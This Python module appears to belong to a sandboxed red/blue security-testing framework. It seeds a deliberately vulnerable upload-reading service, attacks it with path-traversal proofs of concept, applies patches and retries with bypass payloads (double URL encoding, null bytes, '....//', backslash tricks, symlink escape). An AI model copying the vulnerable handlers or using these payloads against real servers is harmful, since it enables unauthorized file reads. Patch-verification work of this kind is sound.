"""ACK Mission 1: Exploit-to-Patch & Bypass Loop (AppSec / Local Service)."""

from __future__ import annotations

from typing import List, Optional, Tuple

from hermes_cyber.ack.catalog import (
    _MissionExecutionOutcome,
    _contract,
    _verify_harness_execution,
)
from hermes_cyber.ack.chamber import DetonationChamber
from hermes_cyber.ack.fog_of_war import FogOfWarController
from hermes_cyber.models import (
    AckMissionDescriptor,
    AckMutationRoundResult,
    AckOracleVerdictType,
    AckStateTransition,
    AckTprFprMatrix,
    ConstrainedActionContract,
    NetEventEvidence,
    OutOfBandOracleEvidence,
    TelemetryAlertEvidence,
)

_M1_HTTP_HANDLER_TAIL = '''\

def handle_request(payload: dict) -> tuple:
    try:
        content = read_upload(str(payload.get("path", "welcome.txt")))
        return 200, {"content": content}
    except Exception as exc:
        return 403, {"error": str(exc)}
'''

_M1_VULNERABLE_SERVICE = '''\
import os
import sys
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent
UPLOAD_ROOT = BASE_DIR / "uploads" / "tenant_a"

def read_upload(rel_path: str) -> str:
    # Vulnerable path handling: naive join allows ../../canary_vault/canary.txt traversal and symlink escape
    target = os.path.normpath(os.path.join(str(UPLOAD_ROOT), rel_path))
    with open(target, "r", encoding="utf-8") as fh:
        return fh.read()
''' + _M1_HTTP_HANDLER_TAIL

_M1_NAIVE_BLOCK_ALL_SERVICE = '''\
def read_upload(rel_path: str) -> str:
    raise PermissionError("naive_block_all: all upload reads disabled")
''' + _M1_HTTP_HANDLER_TAIL

_M1_NAIVE_REPLACE_SERVICE = '''\
import os
import urllib.parse
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent
UPLOAD_ROOT = BASE_DIR / "uploads" / "tenant_a"

def read_upload(rel_path: str) -> str:
    # Flawed single-pass sanitization + URL decode without containment or symlink check
    cleaned = urllib.parse.unquote(rel_path).replace("../", "").replace("..\\\\", "")
    target = os.path.normpath(os.path.join(str(UPLOAD_ROOT), cleaned))
    with open(target, "r", encoding="utf-8") as fh:
        return fh.read()
''' + _M1_HTTP_HANDLER_TAIL

_M1_STRUCTURAL_PATCH_SERVICE = '''\
import urllib.parse
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent
UPLOAD_ROOT = (BASE_DIR / "uploads" / "tenant_a").resolve()

def read_upload(rel_path: str) -> str:
    if not isinstance(rel_path, str) or "\\x00" in rel_path:
        raise PermissionError("Null byte or invalid path rejected")
    decoded = rel_path
    for _ in range(4):
        nxt = urllib.parse.unquote(decoded)
        if nxt == decoded:
            break
        decoded = nxt
    normalized = decoded.replace("\\\\", "/")
    if normalized.startswith("/") or ".." in Path(normalized).parts:
        raise PermissionError("Path traversal rejected before canonicalization")
    candidate = UPLOAD_ROOT / normalized
    if candidate.is_symlink():
        raise PermissionError("Symlink escape rejected")
    cur = UPLOAD_ROOT
    for part in Path(normalized).parts:
        cur = cur / part
        if cur.is_symlink():
            raise PermissionError("Intermediate symlink rejected")
    resolved = candidate.resolve(strict=True)
    if not resolved.is_relative_to(UPLOAD_ROOT):
        raise PermissionError("Escape outside UPLOAD_ROOT rejected")
    return resolved.read_text(encoding="utf-8")
''' + _M1_HTTP_HANDLER_TAIL


def _run_m1_exploit_to_patch(
    chamber: DetonationChamber,
    desc: AckMissionDescriptor,
    fow: FogOfWarController,
    *,
    mutation_rounds: int,
    defense_mode: str,
    target_config_content: Optional[str] = None,
    inject_broken_mutation: bool = False,
) -> _MissionExecutionOutcome:
    del target_config_content
    transitions: List[AckStateTransition] = []
    contracts: List[ConstrainedActionContract] = []
    evidences: List[OutOfBandOracleEvidence] = []
    mut_results: List[AckMutationRoundResult] = []

    chamber.seed_lowerdir({
        "target_service.py": _M1_VULNERABLE_SERVICE,
        "uploads/tenant_a/welcome.txt": "NOEMETRA_WELCOME_OK\n",
    })
    transitions.append(AckStateTransition(
        state="INIT_ARENA",
        actor="CONTROL_PLANE",
        summary=f"Inizializzata DetonationChamber `{chamber.sandbox_id}` ({chamber.isolation_backend}) con server TARGET isolato e canary vault separato.",
        passed=True,
    ))

    # RED_WEAPONIZE + ORACLE_BASELINE_CHECK over isolated TARGET loopback HTTP boundary
    red_ctx = fow.build_red_context(target_invariant=desc.target_invariant, attack_surface="http://127.0.0.1:PORT/read_upload")
    base_poc_code = '''\
import http.client, json, os
from pathlib import Path
port = int(os.environ["ACK_TARGET_PORT"])
conn = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
conn.request("POST", "/", body=json.dumps({"path": "../../canary_vault/canary.txt"}), headers={"Content-Type": "application/json"})
resp = conn.getresponse()
body = json.loads(resp.read().decode("utf-8"))
loot_path = Path(os.environ["ACK_ARTIFACTS_RED"]) / "loot_act_red_base.json"
loot_path.write_text(json.dumps({"status": "COMPLETED", "attempts_executed": 1, "http_status": resp.status, "exfil": body}), encoding="utf-8")
'''
    rel_base, _ = chamber.write_red_artifact("poc_m1_base.py", base_poc_code)
    base_contract = _contract(
        chamber=chamber,
        action_id="act_red_base",
        actor="RED",
        phase="RED_WEAPONIZE",
        primitive="EXEC_ARTIFACT",
        artifact_path=rel_base,
        entrypoint=["python3", rel_base],
        target_invariant=red_ctx["target_invariant"],
        attack_class="CLASS_DIRECT_DOTDOT_TRAVERSAL",
    )
    contracts.append(base_contract)
    with chamber.target_server("target_service.py", "handle_request") as base_port:
        rc, _, _, fs_base = chamber.run_contract(base_contract, extra_env={"ACK_TARGET_PORT": str(base_port)})
    base_ok, base_attempts, _ = _verify_harness_execution(rc, chamber.artifacts_red / "loot_act_red_base.json")
    pre_breach = base_ok and fs_base.canary_accessed
    base_verdict: AckOracleVerdictType = (
        "EXECUTION_ERROR" if not base_ok else ("INVARIANT_BREACHED_STEALTH" if pre_breach else "DEFENSE_HELD_CLEAN")
    )
    base_ev = OutOfBandOracleEvidence(
        action_id=base_contract.action_id,
        exit_code=rc,
        fs_diff=fs_base,
        net_events=[NetEventEvidence(dst=f"127.0.0.1:{base_port}", bytes_out=128, bytes_in=256)],
        telemetry_alerts=[TelemetryAlertEvidence(rule_id="baseline_waf", engine="ebpf_sigma_yara", triggered=False)],
        execution_valid=base_ok,
        attempts_executed=base_attempts,
        isolation_backend=chamber.isolation_backend,
        oracle_verdict=base_verdict,
    )
    evidences.append(base_ev)
    transitions.append(AckStateTransition(
        state="RED_WEAPONIZE",
        actor="RED",
        summary="Red ha costruito PoC HTTP `poc_m1_base.py` contro server target isolato `target_service`.",
        passed=base_ok,
    ))
    transitions.append(AckStateTransition(
        state="ORACLE_BASELINE_CHECK",
        actor="ORACLE",
        summary=f"Oracolo pre-patch: exec_ok={base_ok}, canary_accessed={fs_base.canary_accessed} ({base_verdict}).",
        passed=pre_breach,
    ))

    # BLUE_DEFEND
    _ = fow.build_blue_context(baseline_summary="target_service.py read_upload naive os.path.join", oob_baseline=base_ev)
    if defense_mode == "naive_block_all":
        patched_src = _M1_NAIVE_BLOCK_ALL_SERVICE
        blue_summary = "naive_block_all: disabilitate tutte le letture file senza eccezioni."
    elif defense_mode == "naive_string_replace":
        patched_src = _M1_NAIVE_REPLACE_SERVICE
        blue_summary = "naive_string_replace: singola rimozione `../` senza canonicalizzazione né controllo symlink."
    else:
        patched_src = _M1_STRUCTURAL_PATCH_SERVICE
        blue_summary = (
            "structural: decodifica iterativa, blocco `..` & null-byte, controllo symlink lungo il path, "
            "`Path.resolve().is_relative_to(UPLOAD_ROOT)` + profilo `seccomp_contain.json`."
        )

    rel_blue_script, _ = chamber.write_blue_artifact("apply_patch_m1.py", f'''\
import os
from pathlib import Path
up = Path(os.environ["ACK_UPPERDIR"])
(up / "target_service.py").write_text({patched_src!r}, encoding="utf-8")
(up / "seccomp_contain.json").write_text('{{"defaultAction":"SCMP_ACT_ERRNO","blocked":["symlink","symlinkat","mount"]}}', encoding="utf-8")
''')
    blue_contract = _contract(
        chamber=chamber,
        action_id="act_blue_defend",
        actor="BLUE",
        phase="BLUE_DEFEND",
        primitive="APPLY_DIFF",
        artifact_path=rel_blue_script,
        entrypoint=["python3", rel_blue_script],
        target_invariant=desc.target_invariant,
    )
    contracts.append(blue_contract)
    brc, _, _, bfs = chamber.run_contract(blue_contract)
    evidences.append(OutOfBandOracleEvidence(
        action_id=blue_contract.action_id,
        exit_code=brc,
        fs_diff=bfs,
        isolation_backend=chamber.isolation_backend,
        oracle_verdict="DEFENSE_HELD_CLEAN" if brc == 0 else "EXECUTION_ERROR",
    ))
    transitions.append(AckStateTransition(
        state="BLUE_DEFEND",
        actor="BLUE",
        summary=f"Blue applica patch in modalità `{defense_mode}`: {blue_summary}",
        passed=(brc == 0),
    ))

    # Boot fresh isolated TARGET server with Blue's patched target_service.py
    with chamber.target_server("target_service.py", "handle_request") as patched_port:
        # ORACLE_FUNCTIONAL_AND_FPR_CHECK
        func_rel, _ = chamber.write_blue_artifact("oracle_func_m1.py", '''\
import http.client, json, os
port = int(os.environ["ACK_TARGET_PORT"])
conn = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
conn.request("POST", "/", body=json.dumps({"path": "welcome.txt"}), headers={"Content-Type": "application/json"})
resp = conn.getresponse()
body = json.loads(resp.read().decode("utf-8"))
assert resp.status == 200 and "NOEMETRA_WELCOME_OK" in body.get("content", ""), f"Unexpected output: {resp.status} {body!r}"
print("FUNC_OK")
''')
        func_contract = _contract(
            chamber=chamber,
            action_id="act_oracle_func",
            actor="BLUE",
            phase="ORACLE_FUNCTIONAL_AND_FPR_CHECK",
            primitive="EXEC_ARTIFACT",
            artifact_path=func_rel,
            entrypoint=["python3", func_rel],
            target_invariant="INV_LEGITIMATE_READ_SURVIVES",
        )
        contracts.append(func_contract)
        frc, fout, _, ffs = chamber.run_contract(func_contract, extra_env={"ACK_TARGET_PORT": str(patched_port)})
        func_ok = (frc == 0 and "FUNC_OK" in fout)
        func_verdict: AckOracleVerdictType = "DEFENSE_HELD_CLEAN" if func_ok else "DEFENSE_REJECTED_BROKEN_FUNC"
        evidences.append(OutOfBandOracleEvidence(
            action_id=func_contract.action_id,
            exit_code=frc,
            fs_diff=ffs,
            functional_suite_passed=func_ok,
            fpr_value=0.0,
            isolation_backend=chamber.isolation_backend,
            oracle_verdict=func_verdict,
        ))
        transitions.append(AckStateTransition(
            state="ORACLE_FUNCTIONAL_AND_FPR_CHECK",
            actor="ORACLE",
            summary=f"Test funzionale servizio target: passed={func_ok} ({func_verdict}).",
            passed=func_ok,
        ))

        if not func_ok:
            transitions.append(AckStateTransition(
                state="CERTIFY_REPORT",
                actor="ORACLE",
                summary="Certificazione respinta: la difesa ha rotto la funzionalità legittima del servizio.",
                passed=False,
            ))
            return _MissionExecutionOutcome(
                transitions=transitions,
                contracts=contracts,
                evidences=evidences,
                mutation_rounds=[],
                tpr_fpr_matrix=AckTprFprMatrix(
                    true_positive_rate=0.0,
                    false_positive_rate=0.0,
                    evasion_resistance_rate=0.0,
                    functional_survival_rate=0.0,
                    pre_patch_breach_confirmed=pre_breach,
                    post_patch_breaches=0,
                ),
                blue_summary=blue_summary,
                certified=False,
                certification_verdict="REJECTED_BROKEN_FUNCTIONALITY",
                rationale="Oracolo anti-cheat: la difesa naive ha bloccato le richieste legittime invece di correggere l'invariante.",
            )

        # RED_MUTATE_BYPASS (distinct attack classes forced by FogOfWarController, strictly over HTTP)
        mutation_specs: List[Tuple[str, str]] = [
            (
                "CLASS_DOUBLE_URL_ENCODING_NULL_BYTE",
                '''\
import http.client, json, os
from pathlib import Path
port = int(os.environ["ACK_TARGET_PORT"])
loot_path = Path(os.environ["ACK_ARTIFACTS_RED"]) / "loot_{aid}.json"
hits = []
for payload in (
    "%252e%252e/%252e%252e/canary_vault/canary.txt",
    "....//....//canary_vault/canary.txt",
    "../../canary_vault/canary.txt\\x00.png",
):
    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
    conn.request("POST", "/", body=json.dumps({{"path": payload}}), headers={{"Content-Type": "application/json"}})
    resp = conn.getresponse()
    body = json.loads(resp.read().decode("utf-8"))
    hits.append(body.get("content") or f"BLOCKED({{resp.status}}): {{body.get('error', '')}}")
loot_path.write_text(json.dumps({{"status": "COMPLETED", "attempts_executed": len(hits), "attempts": hits}}), encoding="utf-8")
''',
            ),
            (
                "CLASS_SYMLINK_AND_NESTED_ESCAPE",
                '''\
import http.client, json, os
from pathlib import Path
port = int(os.environ["ACK_TARGET_PORT"])
up = Path(os.environ["ACK_UPPERDIR"])
link_path = up / "uploads" / "tenant_a" / "sym_canary.txt"
loot_path = Path(os.environ["ACK_ARTIFACTS_RED"]) / "loot_{aid}.json"
hits = []
try:
    if not link_path.exists() and not link_path.is_symlink():
        os.symlink(str(up / "canary_vault" / "canary.txt"), str(link_path))
except OSError:
    pass
for payload in ("sym_canary.txt", "....//....//canary_vault/canary.txt"):
    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
    conn.request("POST", "/", body=json.dumps({{"path": payload}}), headers={{"Content-Type": "application/json"}})
    resp = conn.getresponse()
    body = json.loads(resp.read().decode("utf-8"))
    hits.append(body.get("content") or f"BLOCKED({{resp.status}}): {{body.get('error', '')}}")
loot_path.write_text(json.dumps({{"status": "COMPLETED", "attempts_executed": len(hits), "attempts": hits}}), encoding="utf-8")
''',
            ),
            (
                "CLASS_BACKSLASH_UNC_NORMALIZATION_DIFFERENTIAL",
                '''\
import http.client, json, os
from pathlib import Path
port = int(os.environ["ACK_TARGET_PORT"])
loot_path = Path(os.environ["ACK_ARTIFACTS_RED"]) / "loot_{aid}.json"
hits = []
for payload in (
    "..\\\\/..\\\\/canary_vault\\\\canary.txt",
    "sub/../../../canary_vault/canary.txt",
    "%2e%2e%5c%2e%2e%5ccanary_vault%5ccanary.txt",
):
    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
    conn.request("POST", "/", body=json.dumps({{"path": payload}}), headers={{"Content-Type": "application/json"}})
    resp = conn.getresponse()
    body = json.loads(resp.read().decode("utf-8"))
    hits.append(body.get("content") or f"BLOCKED({{resp.status}}): {{body.get('error', '')}}")
loot_path.write_text(json.dumps({{"status": "COMPLETED", "attempts_executed": len(hits), "attempts": hits}}), encoding="utf-8")
''',
            ),
        ]

        rounds_to_run = max(1, min(len(mutation_specs), mutation_rounds))
        post_breaches = 0
        exec_errors = 0
        for idx in range(rounds_to_run):
            atk_class, tmpl = mutation_specs[idx]
            aid = f"act_red_mut_{idx + 1:02d}"
            if inject_broken_mutation and idx == 0:
                script_body = "raise RuntimeError('Simulated broken mutation harness without loot output')\n"
            else:
                script_body = tmpl.format(aid=aid)
            rel_mut, _ = chamber.write_red_artifact(f"poc_m1_mut_{idx + 1:02d}.py", script_body)
            m_contract = _contract(
                chamber=chamber,
                action_id=aid,
                actor="RED",
                phase="RED_MUTATE_BYPASS",
                primitive="EXEC_ARTIFACT",
                artifact_path=rel_mut,
                entrypoint=["python3", rel_mut],
                target_invariant=desc.target_invariant,
                attack_class=atk_class,
            )
            contracts.append(m_contract)
            mrc, _, _, mfs = chamber.run_contract(m_contract, extra_env={"ACK_TARGET_PORT": str(patched_port)})
            exec_ok, attempts_n, _ = _verify_harness_execution(mrc, chamber.artifacts_red / f"loot_{aid}.json")
            if not exec_ok:
                exec_errors += 1
                bypassed = False
                m_verdict: AckOracleVerdictType = "EXECUTION_ERROR"
            else:
                bypassed = mfs.canary_accessed
                if bypassed:
                    post_breaches += 1
                m_verdict = "INVARIANT_BREACHED_STEALTH" if bypassed else "DEFENSE_HELD_CLEAN"

            mev = OutOfBandOracleEvidence(
                action_id=aid,
                exit_code=mrc,
                fs_diff=mfs,
                net_events=[NetEventEvidence(dst=f"127.0.0.1:{patched_port}", bytes_out=160, bytes_in=128)],
                telemetry_alerts=[
                    TelemetryAlertEvidence(
                        rule_id="seccomp_contain",
                        engine="seccomp_kernel",
                        triggered=bool(exec_ok and not bypassed),
                    )
                ],
                execution_valid=exec_ok,
                attempts_executed=attempts_n,
                isolation_backend=chamber.isolation_backend,
                oracle_verdict=m_verdict,
            )
            evidences.append(mev)
            prev_failed = fow.record_outcome(atk_class, bypass_succeeded=bool(exec_ok and bypassed))
            mut_results.append(AckMutationRoundResult(
                round_index=idx + 1,
                attack_class=atk_class,
                previous_failed_classes=prev_failed,
                contract=m_contract,
                oracle_evidence=mev,
                execution_valid=exec_ok,
                attempts_executed=attempts_n,
                bypass_succeeded=bypassed,
            ))

    transitions.append(AckStateTransition(
        state="RED_MUTATE_BYPASS",
        actor="RED",
        summary=f"Eseguiti {rounds_to_run} round di mutazione: bypass={post_breaches}, execution_errors={exec_errors}.",
        passed=(post_breaches == 0 and exec_errors == 0),
    ))
    valid_defended = sum(1 for r in mut_results if r.execution_valid and not r.bypass_succeeded)
    evasion_res = round(valid_defended / rounds_to_run, 3)
    certified = bool(pre_breach and func_ok and post_breaches == 0 and exec_errors == 0)
    if exec_errors > 0:
        cert_verdict = "REJECTED_MUTATION_EXECUTION_ERROR"
        rationale = f"Certificazione negata (fail-closed): {exec_errors} round di mutazione non eseguiti correttamente (`EXECUTION_ERROR`)."
    elif certified:
        cert_verdict = "CERTIFIED_RESILIENT_PATCH"
        rationale = "Tutti i 7 stati completati con esecuzioni validate, diff FS out-of-band e zero accessi canary post-patch."
    else:
        cert_verdict = "BYPASSED_BY_RED_MUTATION"
        rationale = f"Red ha aggirato la difesa in {post_breaches} round di mutazione ({defense_mode})."

    transitions.append(AckStateTransition(
        state="CERTIFY_REPORT",
        actor="ORACLE",
        summary=rationale,
        passed=certified,
    ))
    return _MissionExecutionOutcome(
        transitions=transitions,
        contracts=contracts,
        evidences=evidences,
        mutation_rounds=mut_results,
        tpr_fpr_matrix=AckTprFprMatrix(
            true_positive_rate=evasion_res,
            false_positive_rate=0.0,
            evasion_resistance_rate=evasion_res,
            functional_survival_rate=1.0,
            pre_patch_breach_confirmed=pre_breach,
            post_patch_breaches=post_breaches + exec_errors,
        ),
        blue_summary=blue_summary,
        certified=certified,
        certification_verdict=cert_verdict,
        rationale=rationale,
    )
